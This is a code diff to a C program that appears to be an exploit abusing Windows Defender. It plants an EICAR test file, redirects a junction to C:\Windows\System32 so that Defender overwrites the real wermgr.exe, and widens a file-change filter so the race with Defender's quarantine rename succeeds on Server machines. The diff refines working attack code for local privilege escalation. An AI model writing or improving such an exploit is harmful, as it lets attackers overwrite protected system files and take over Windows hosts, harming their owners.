@@ -78979,6 +78979,16 @@ int main()
 	}
 	wchar_t mntpath[MAX_PATH] = { 0 };
 	wcscpy(mntpath, g_devicepath);
+	// On Server without ISO/VHD: the junction needs to point to the directory
+	// containing wermgr.exe. The ISO has it at the mount root, but the system
+	// device path points to the volume root. Append \Windows\System32 so the
+	// junction resolves maindirname\wermgr.exe -> C:\Windows\System32\wermgr.exe
+	// (the real system wermgr.exe that we want Defender to overwrite).
+	if (!g_using_vhd)
+	{
+		wcscat(mntpath, L"\\Windows\\System32");
+		printf("[DEBUG] Server mode: mntpath adjusted to %ws\n", mntpath);
+	}
 	// Server fallback: pass NULL for isomnt when using system device (no ISO to read from)
 	HANDLE heicar = WriteEicar(maindirname, g_using_vhd ? mntpath : NULL);
 	if (!heicar)
@@ -79063,9 +79073,24 @@ int main()
 		PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
 		printf("[DEBUG] ReadDirectoryChangesW returned: FileName=%ws, Action=%d, FileNameLength=%d\n", 
 			pfni->FileNameLength > 0 ? pfni->FileName : L"(null)", pfni->Action, pfni->FileNameLength);
-		if (pfni->FileNameLength / 2 != 24 || _wcsnicmp(&pfni->FileName[0], teststr, 8) != 0)
-			continue;
-		break;
+		// Widen the filter: accept any file rename under Temp\ that starts with TMP or is
+		// a hex-looking quarantine name. On NTFS, Defender may use different naming patterns.
+		// Original filter: pfni->FileNameLength / 2 != 24 || _wcsnicmp(...)
+		wchar_t* fname = pfni->FileName;
+		DWORD fnamelen = pfni->FileNameLength / 2;
+		// Accept if filename starts with "Temp\" (5 chars)
+		if (fnamelen > 5 && _wcsnicmp(fname, L"Temp\\", 5) == 0)
+		{
+			printf("[DEBUG] Matched Temp\\ file change: %ws (len=%d)\n", fname, fnamelen);
+			break;
+		}
+		// Also accept the original pattern
+		if (fnamelen == 24 && _wcsnicmp(fname, teststr, 8) == 0)
+		{
+			printf("[DEBUG] Matched original Temp\\TMP pattern: %ws\n", fname);
+			break;
+		}
+		continue;
 	} while (1);
 	printf("[DEBUG] ReadDirectoryChangesW: detected expected rename, proceeding.\n");
 
